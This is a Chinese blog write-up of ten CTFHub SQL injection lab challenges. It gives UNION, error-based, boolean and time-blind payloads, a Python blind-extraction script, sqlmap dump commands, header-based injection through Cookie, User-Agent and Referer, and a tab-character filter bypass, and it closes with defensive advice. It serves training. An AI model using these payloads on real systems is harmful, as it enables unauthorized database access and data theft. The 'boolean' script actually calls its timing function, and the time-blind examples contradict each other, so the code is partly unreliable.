---
title: "SQL 注入：CTFHub 实战 10 题"
date: "2026-11-14T15:30:31+08:00"
tags:
  - CTF
  - CTFHub
  - SQL注入
description: "按整数型、字符型、报错、布尔与时间盲注、请求头注入等十道 CTFHub 题目记录注入判断、数据提取与工具验证的操作过程。"
---

> 本文根据 CTFHub SQL 注入 10 道题的练习记录整理，覆盖整数型、字符型、报错注入、布尔盲注、时间盲注、MySQL 结构、Cookie 注入、UA 注入、Referer 注入、过滤空格。靶场地址与 flag 为动态值，文中仅作示例；所有操作仅针对 CTFHub 提供的合法靶场环境。

# 一、准备

手工注入主要使用浏览器、Burp Suite 和自写脚本；MySQL 结构题使用 sqlmap。布尔盲注与时间盲注的脚本引用了 `http_req.py` 中的 `send_once`，需要把该文件放在脚本同目录。

10 道题对应关系：

| # | 题目 | 注入类型 | 关键点 |
| --- | --- | --- | --- |
| 1 | 整数型注入 | UNION 联合查询 | 数字参数，无需引号闭合 |
| 2 | 字符型注入 | UNION 联合查询 | 单引号闭合 |
| 3 | 报错注入 | XPath / 主键重复报错 | `extractvalue`、`updatexml`、`floor` |
| 4 | 布尔盲注 | 布尔盲注 | 页面只返回真/假 |
| 5 | 时间盲注 | 时间盲注 | `sleep()` 延迟 |
| 6 | MySQL 结构 | sqlmap 自动化 | `--current-db`、`--tables`、`--columns`、`--dump` |
| 7 | Cookie 注入 | HTTP 头注入 | 注入点在 `Cookie` |
| 8 | UA 注入 | HTTP 头注入 | 注入点在 `User-Agent` |
| 9 | Referer 注入 | HTTP 头注入 | 注入点在 `Referer` |
| 10 | 过滤空格 | 黑名单绕过 | 用 `%09` 等空白字符替代空格 |

---

# 二、整数型注入

![二、整数型注入：整数型注入、题目](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/01-int-task.png)

![二、整数型注入：整数型注入、页面](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/02-int-page.png)

**分析**：

页面接收 `id` 参数，查询语句的字段数为 2，页面输出 `ID` 和 `Data` 两个位置。整数型注入的参数不加引号，直接拼接进 SQL 语句。

**判断注入点**：

```sql
1 AND 1=1
1 AND 1=2
```

`AND 1=1` 返回正常，`AND 1=2` 返回空，说明参数进入 SQL 语句并参与了条件判断。

![二、整数型注入：整数型注入、and1](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/03-int-and1.png)

![二、整数型注入：整数型注入、and2](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/04-int-and2.png)

**判断字段数**：

```sql
-1 UNION SELECT 1,2
```

`-1` 让原查询返回 0 行，`UNION SELECT 1,2` 的列数与原查询一致时，页面回显 `1` 和 `2`。

![二、整数型注入：整数型注入、union](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/05-int-union.png)

**查表名**：

```sql
-1 UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()
```

![二、整数型注入：整数型注入、数据表](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/06-int-tables.png)

**查字段名**：

```sql
-1 UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_name = "flag"
```

![二、整数型注入：整数型注入、字段](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/07-int-columns.png)

**读数据**：

```sql
-1 UNION SELECT 1,group_concat(flag) FROM flag
```

![二、整数型注入：整数型注入、数据](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/08-int-data.png)

**知识点**：

- 整数型注入不需要闭合引号，`-1` 用于让原查询为空；
- `UNION` 要求前后查询列数一致；
- `group_concat()` 把多行结果拼成一行，便于在单个回显位输出；
- `information_schema.tables`、`information_schema.columns` 保存库、表、字段的元数据；
- `database()` 返回当前数据库名。

---

# 三、字符型注入

![三、字符型注入：字符型注入、题目](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/09-char-task.png)

![三、字符型注入：字符型注入、页面](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/10-char-page.png)

![三、字符型注入：字符型注入、源码](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/11-char-source.png)

**分析**：

参数被单引号包裹，直接输入 `1` 可以正常查询，输入 `1'` 可能报错。字符型注入需要先闭合单引号，再构造后续语句。

**判断注入点**：

```sql
1' AND '1'='1
1' AND '1'='2
```

`1' AND '1'='1` 返回正常，`1' AND '1'='2` 返回空。

![三、字符型注入：字符型注入、and1](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/12-char-and1.png)

![三、字符型注入：字符型注入、and2](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/13-char-and2.png)

**判断字段数并查表名**：

```sql
-1' UNION SELECT 1,2 AND '1' = '1
-1' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema = database() AND '1' = '1
```

![三、字符型注入：字符型注入、union](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/14-char-union.png)

![三、字符型注入：字符型注入、数据表](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/15-char-tables.png)

**查字段名并读数据**：

```sql
-1' UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_name = "flag" AND '1' = '1
-1' UNION SELECT 1,group_concat(flag) FROM flag WHERE '1' = '1
```

![三、字符型注入：字符型注入、字段](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/16-char-columns.png)

![三、字符型注入：字符型注入、数据](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/17-char-data.png)

**知识点**：

- 字符型注入的关键是引号闭合；
- 闭合后要保持原查询的语法平衡，例如用 `AND '1'='1` 补齐尾部引号；
- 字段数、表名、字段名、数据的查询顺序与整数型一致；
- 如果页面不回显，需要改用报错注入或盲注。

---

# 四、报错注入

![四、报错注入：报错注入、题目](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/18-error-task.png)

![四、报错注入：报错注入、页面](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/19-error-page.png)

![四、报错注入：报错注入、normal](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/20-error-normal.png)

**分析**：

页面只返回“查找是否成功”，没有正常回显位。此时可以利用 MySQL 的报错函数，把查询结果拼进错误信息中。

常用函数：

```sql
# xml_documen为XML文档对象的名称，xpath_expr为Xpath格式的字符串
extractvalue(xml_document, xpath_expr)
# xml_target为XML文档对象的名称，xpath_expr为Xpath格式的字符串，new_val为String格式，用于替换数据
updatexml(xml_document, xpath_expr, new_val)

floor(number) # 向下取整
rand() # 生成一个0~1之间的随机浮点数
count(*) # 统计某个表下总共有多少条记录
group by x # 按照（by）一定的规则（x）进行分组
```

**获取当前数据库名**：

```sql
1 AND extractvalue(1,concat('~',database()))
1 AND updatexml(1,concat('~',database()),1)
1 AND (SELECT 1 FROM (SELECT count(*),concat(database(),floor(rand(0)*2)) x FROM information_schema.tables group by x) a)
```

![四、报错注入：报错注入、db](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/21-error-db.png)

**查表名**：

```sql
1 AND extractvalue(1,concat('~',(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))
1 AND updatexml(1,concat('~',(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())),1)
```

![四、报错注入：报错注入、数据表](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/22-error-tables.png)

**查字段名**：

```sql
1 AND extractvalue(1,concat('~',(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name = "flag")))
1 AND updatexml(1,concat('~',(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name = "flag")),1)
```

![四、报错注入：报错注入、字段](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/23-error-columns.png)

**读数据**：

```sql
1 AND extractvalue(1,concat('~',(SELECT group_concat(flag) FROM flag)))
1 AND updatexml(1,concat('~',(SELECT group_concat(flag) FROM flag)),1)
```

![四、报错注入：报错注入、数据](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/24-error-data.png)

**32 字符限制**：

`extractvalue()` 和 `updatexml()` 的报错信息最多回显 32 个字符。flag 较长时，使用 `substr()` 分段查询：

```sql
# 查看前32个字符（从第一个往后查32）
1 AND extractvalue(1,concat('~',substr((SELECT group_concat(flag) FROM flag),1,32)))
# 从第32个字符开始，往后查32个
1 AND extractvalue(1,concat('~',substr((SELECT group_concat(flag) FROM flag),32,32)))
```

![四、报错注入：报错注入、substr](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/25-error-substr.png)

**知识点**：

- 报错注入的前提是页面回显数据库错误，且报错函数未被过滤；
- `extractvalue()` 和 `updatexml()` 通过非法的 XPath 表达式触发错误；
- `floor()`、`rand()`、`count()`、`group by` 联用可以触发主键重复错误；
- 报错回显长度有限，长数据需要分段读取；
- 生产环境应关闭详细错误回显，统一返回通用错误页面。

---

---

# 五、布尔盲注

![五、布尔盲注：布尔盲注、题目](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/26-bool-task.png)

![五、布尔盲注：布尔盲注、页面](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/27-bool-page.png)

**分析**：

页面只返回两种结果：查询成功或失败。没有回显位，也没有数据库报错，只能通过页面差异判断条件真假。

先测试单个字符：

```sql
1 AND substr(database(),1,1) = 's'
```

![五、布尔盲注：布尔盲注、测试](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/28-bool-test.png)

手工逐字符猜测效率很低，使用脚本按字符二分：

```python
import urllib.parse
import time
from http_req import send_once

HOST = "challenge-2141d41f2d39ab5a.sandbox.ctfhub.com"
PORT = 10800

SLEEP = 2                     # 目标睡几秒
THRESHOLD = SLEEP * 0.7       # 判定阈值：留 30% 余量抗网络抖动

def test_time(cond):
    # 条件成立就睡 SLEEP 秒，不成立立刻返回
    path = "/?id=" + urllib.parse.quote(f"1 AND IF({cond},SLEEP({SLEEP}),0)")
    t0 = time.time()                       # 开始计时
    send_once(HOST, PORT, "GET", path, {})
    cost = time.time() - t0                # 实际耗时
    return cost >= THRESHOLD               # 超过阈值 = 条件为真

def test_bool(cond):
    # 发一次布尔查询，返回 TRUE/FALSE
    # 整段编码
    path = "/?id=" + urllib.parse.quote("1 AND " + cond)
    status,_,text = send_once(HOST,PORT,"GET",path,{})
    return "query_success" in text

def get_char(sql,pos):
    # 利用二分提高效率
    lo,hi = 32,126
    while lo < hi:
        mid = (lo + hi) // 2
        if(test_time(f"ascii(substr(({sql}),{pos},1)) > {mid}")):
            lo = mid + 1
        else:
            hi = mid

    return chr(lo)

def get_str(sql,max_len=64):
    # 逐位取完整字符串
    out = ""
    for pos in range(1,max_len + 1):
        if not test_time(f"length(({sql})) >= {pos}"):
            break
        ch = get_char(sql,pos)
        out += ch
        print(f"[{pos}] {ch} -> {out}")

    return out

if __name__ == "__main__":
    print("链路自检:", test_time("ascii(substr((select database()),1,1))>100"))
    print(get_str("SELECT database()"))

"""
def send_once(host, port, method, path, headers, body=""):
    connect = http.client.HTTPConnection(host, port, timeout=5)
    try:
        # 字符串要先编码成字节：http.client 默认用 latin-1 编码 str，中文会炸
        data = body.encode("utf-8") if isinstance(body, str) else body
        connect.request(method, path, body=data, headers=headers)    # 把 data 发出去
        response = connect.getresponse()
        status = response.status
        text = response.read().decode("utf-8", "ignore")
        return status, response.headers.items(), text
    except Exception as e:
        print("Error:", e)
        return 0, [], ""
    finally:
        connect.close()
"""
```

**查表名**：

```python
print(get_str("SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()"))
```

![五、布尔盲注：布尔盲注、数据表](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/29-bool-tables.png)

**查字段名**：

```python
print(get_str("SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name=\"flag\""))
```

![五、布尔盲注：布尔盲注、字段](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/30-bool-columns.png)

**读数据**：

```python
print(get_str("SELECT group_concat(flag) FROM flag"))
```

![五、布尔盲注：布尔盲注、数据](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/31-bool-data.png)

**知识点**：

- 布尔盲注把查询结果转换为真/假条件；
- `substr()` 截取字符，`ascii()` 转换为 ASCII 码，二分法缩小范围；
- `length()` 判断字符串长度，决定循环边界；
- 脚本中的 `test_bool()` 用页面关键字判断布尔结果，`test_time()` 用于时间盲注；
- 请求间隔、网络抖动和页面差异会影响判断，需要设置阈值和重试。

---

# 六、时间盲注

![六、时间盲注：时间盲注、题目](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/32-time-task.png)

![六、时间盲注：时间盲注、页面](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/33-time-page.png)

**分析**：

页面只有一种返回结果，无法通过内容判断真假。使用 `sleep()` 让条件成立时延迟响应，通过响应时间判断条件。

基本语句：

```sql
1 AND if(substr(database(),1,1)='a',1,sleep(5))
```

![六、时间盲注：时间盲注、sleep](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/34-time-sleep.png)

脚本与布尔盲注相同，把目标改为 flag：

```python
print(get_str("SELECT group_concat(flag) FROM flag"))
```

![六、时间盲注：时间盲注、数据](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/35-time-data.png)

**知识点**：

- `sleep(N)` 延迟 N 秒，`benchmark(count,expr)` 重复执行表达式；
- 条件成立时触发延迟，不成立时立即返回；
- 时间盲注受网络延迟影响，阈值通常取 `SLEEP * 0.7` 左右；
- 二分法同样适用于时间盲注，可减少请求次数；
- 时间盲注请求量大、耗时长，测试时需要控制并发和超时。

---

# 七、MySQL 结构（sqlmap）

![七、MySQL 结构（sqlmap）：MySQL、题目](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/36-mysql-task.png)

![七、MySQL 结构（sqlmap）：MySQL、页面](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/37-mysql-page.png)

**分析**：

使用 sqlmap 自动化检测注入点、识别注入类型，再依次获取库名、表名、字段名和字段值。

**检测注入点**：

```powershell
python.exe .\sqlmap.py -u "http://challenge-6409b99fcd8a5c01.sandbox.ctfhub.com:10800/?id=1"
```

![七、MySQL 结构（sqlmap）：MySQL、detect](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/38-mysql-detect.png)

输出显示 `SLEEP` 和 `UNION` 注入都可行。

**获取库、表、字段、数据**：

```powershell
# 当前库名
python.exe .\sqlmap.py -u "http://challenge-6409b99fcd8a5c01.sandbox.ctfhub.com:10800/?id=1" --current-db
# 库中的表
python.exe .\sqlmap.py -u "http://challenge-6409b99fcd8a5c01.sandbox.ctfhub.com:10800/?id=1" -D sqli --tables
# 表中的字段名
python.exe .\sqlmap.py -u "http://challenge-6409b99fcd8a5c01.sandbox.ctfhub.com:10800/?id=1" -D sqli -T keazmocgkh --columns
# 字段值
python.exe .\sqlmap.py -u "http://challenge-6409b99fcd8a5c01.sandbox.ctfhub.com:10800/?id=1" -D sqli -T keazmocgkh -C pamchrclkz --dump
```

![七、MySQL 结构（sqlmap）：MySQL、db](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/39-mysql-db.png)

![七、MySQL 结构（sqlmap）：MySQL、数据表](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/40-mysql-tables.png)

![七、MySQL 结构（sqlmap）：MySQL、字段](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/41-mysql-columns.png)

![七、MySQL 结构（sqlmap）：MySQL、dump](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/42-mysql-dump.png)

**知识点**：

- `-u` 指定目标 URL；
- `--current-db` 获取当前库名；
- `-D` 指定数据库，`--tables` 列表；
- `-T` 指定表，`--columns` 列出字段；
- `-C` 指定字段，`--dump` 导出数据；
- sqlmap 会自动判断注入技术、数据库类型和版本；
- 自动化工具的输出需要人工核对，避免误报和请求过大。

---

# 八、Cookie 注入

![八、Cookie 注入：Cookie、题目](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/43-cookie-task.png)

![八、Cookie 注入：Cookie、页面](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/44-cookie-page.png)

**分析**：

页面提示输入点从 URL 参数换到了 Cookie。使用 Burp Suite 拦截请求，在 `Cookie` 头中构造 payload。

**判断回显位**：

```http
Cookie: id=-1 UNION SELECT 1,2
```

![八、Cookie 注入：Cookie、burp](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/45-cookie-burp.png)

**查表名**：

```http
Cookie: id=-1 UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()
```

![八、Cookie 注入：Cookie、数据表](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/46-cookie-tables.png)

**查字段名**：

```http
Cookie: id=-1 UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_name="ovjpsakvww"
```

![八、Cookie 注入：Cookie、字段](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/47-cookie-columns.png)

**读数据**：

```http
Cookie: id=-1 UNION SELECT 1,group_concat(gybrntmptf) FROM ovjpsakvww
```

![八、Cookie 注入：Cookie、数据](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/48-cookie-data.png)

**知识点**：

- Cookie 是客户端可控数据，服务端如果直接拼接进 SQL 就会形成注入；
- 注入点不一定在 URL，任何进入 SQL 语句的请求头都可能成为入口；
- 使用 Burp 的 Repeater 可以反复修改 Cookie 并观察响应；
- 防御应对 Cookie 中的身份标识做签名校验，并使用参数化查询。

---

# 九、UA 注入

![九、UA 注入：User-Agent、题目](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/49-ua-task.png)

![九、UA 注入：User-Agent、页面](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/50-ua-page.png)

**分析**：

页面直接把 `User-Agent` 拼进 `select * from news where id=...`。拦截请求，把 payload 放入 `User-Agent` 头。

**判断回显位**：

```http
User-Agent: -1 UNION SELECT 1,2
```

![九、UA 注入：User-Agent、burp](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/51-ua-burp.png)

**查表名**：

```http
User-Agent: -1 UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()
```

![九、UA 注入：User-Agent、数据表](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/52-ua-tables.png)

**查字段名**：

```http
User-Agent: -1 UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_name="zvzzmtgoyl"
```

![九、UA 注入：User-Agent、字段](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/53-ua-columns.png)

**读数据**：

```http
User-Agent: -1 UNION SELECT 1,group_concat(paovfowsnu) FROM zvzzmtgoyl
```

![九、UA 注入：User-Agent、数据](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/54-ua-data.png)

**知识点**：

- UA 注入常见于记录访问者信息的页面；
- 服务端可能用 `INSERT` 把 UA 写入数据库，此时需要根据语句结构调整闭合方式；
- 本题的查询语句是 `select * from news where id=...`，payload 直接接在 `id=` 后；
- Burp 修改请求头后，响应中的 SQL 语句可以帮助确认拼接位置。

---

# 十、Referer 注入

![十、Referer 注入：Referer、题目](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/55-refer-task.png)

![十、Referer 注入：Referer、页面](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/56-refer-page.png)

**分析**：

页面提示在 `Referer` 输入 ID。请求是 POST，`Referer` 头被拼进 SQL 语句。

**判断回显位**：

```http
Referer: 1
```

![十、Referer 注入：Referer、burp](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/57-refer-burp.png)

**读取数据**：

```http
Referer: -1 UNION SELECT 1,group_concat(hijggfxrfs) FROM higfmabiib
```

![十、Referer 注入：Referer、数据](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/58-refer-data.png)

**知识点**：

- Referer 注入常见于统计访问来源、记录点击量的功能；
- 注入点可能在 POST 请求中，需要用 Burp 修改 `Referer`；
- 表名和字段名可以通过 `information_schema` 获取，也可以根据报错或页面提示推断；
- 本题直接使用 `UNION SELECT` 读取目标表字段。

---

# 十一、过滤空格

![十一、过滤空格：过滤绕过、题目](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/59-filter-task.png)

![十一、过滤空格：过滤绕过、页面](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/60-filter-page.png)

**分析**：

题目过滤了空格，直接使用普通空格会返回 `Hacker!!!`。MySQL 把多种空白字符都视为分隔符，可以用 URL 编码的制表符 `%09` 替代空格。

| 字符 | 编码 | MySQL 是否认作分隔 |
| --- | --- | --- |
| 空格 | `0x20` / `%20` | 是，但被过滤 |
| 水平制表 | `0x09` / `%09` | 是 |
| 换行 | `0x0A` / `%0a` | 是 |
| 回车 | `0x0D` / `%0d` | 是 |
| 垂直制表 | `0x0B` / `%0b` | 是 |
| 换页 | `0x0C` / `%0c` | 是 |

**判断回显位**：

```http
GET /?id=-1%09UNION%09SELECT%091,2 HTTP/1.1
```

![十一、过滤空格：过滤绕过、union](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/61-filter-union.png)

**查表名**：

```http
GET /?id=-1%09UNION%09SELECT%091,group_concat(table_name)%09FROM%09information_schema.tables%09WHERE%09table_schema=database() HTTP/1.1
```

![十一、过滤空格：过滤绕过、数据表](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/62-filter-tables.png)

**读数据**：

```http
GET /?id=-1%09UNION%09SELECT%091,group_concat(anzzwkuqho)%09FROM%09huizcbwvvc HTTP/1.1
```

![十一、过滤空格：过滤绕过、数据](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/sql/63-filter-data.png)

**知识点**：

- 空格过滤只拦截 `0x20`，不拦截其他空白字符；
- `%09` 在 URL 解码后是水平制表符，MySQL 解析 SQL 时将其视为分隔符；
- 除了 `%09`，还可以尝试 `%0a`、`%0d`、`%0b`、`%0c`；
- 过滤空格时，函数名、关键字、表名之间都需要用替代字符分隔。

---

# 十二、10 题知识点对照

| # | 题目 | 类型 | 核心 payload / 方法 |
| --- | --- | --- | --- |
| 1 | 整数型 | UNION | `-1 UNION SELECT 1,2` |
| 2 | 字符型 | UNION | `-1' UNION SELECT 1,2 AND '1'='1` |
| 3 | 报错注入 | XPath / 主键重复 | `extractvalue()`、`updatexml()`、`floor()` |
| 4 | 布尔盲注 | Boolean | `substr()` + `ascii()` 二分 |
| 5 | 时间盲注 | Time | `if(cond,sleep(5),1)` |
| 6 | MySQL 结构 | sqlmap | `--current-db`、`--tables`、`--columns`、`--dump` |
| 7 | Cookie | Header | `Cookie: id=-1 UNION SELECT ...` |
| 8 | UA | Header | `User-Agent: -1 UNION SELECT ...` |
| 9 | Referer | Header | `Referer: -1 UNION SELECT ...` |
| 10 | 过滤空格 | 黑名单绕过 | `%09` 替代空格 |

---

# 十三、总结

10 道题覆盖了 SQL 注入的主要类型：

1. **UNION 联合查询**：有回显位时优先使用，要求列数一致；
2. **报错注入**：页面回显数据库错误时，用报错函数把数据带入错误信息；
3. **布尔盲注**：页面只有真/假两种结果时，通过条件判断逐字符读取；
4. **时间盲注**：页面只有一种结果时，通过 `sleep()` 的响应时间判断；
5. **HTTP 头注入**：Cookie、User-Agent、Referer 等进入 SQL 语句的请求头都可能成为注入点；
6. **黑名单绕过**：过滤空格时使用 `%09` 等替代分隔符；
7. **自动化工具**：sqlmap 可以提高效率，但需要理解其输出和注入类型。

SQL 注入的根因是**用户输入被当作 SQL 代码拼接执行**。防御应以参数化查询为核心，配合最小权限、关闭详细错误、输入校验、WAF 和审计，而不是只依赖关键字过滤。
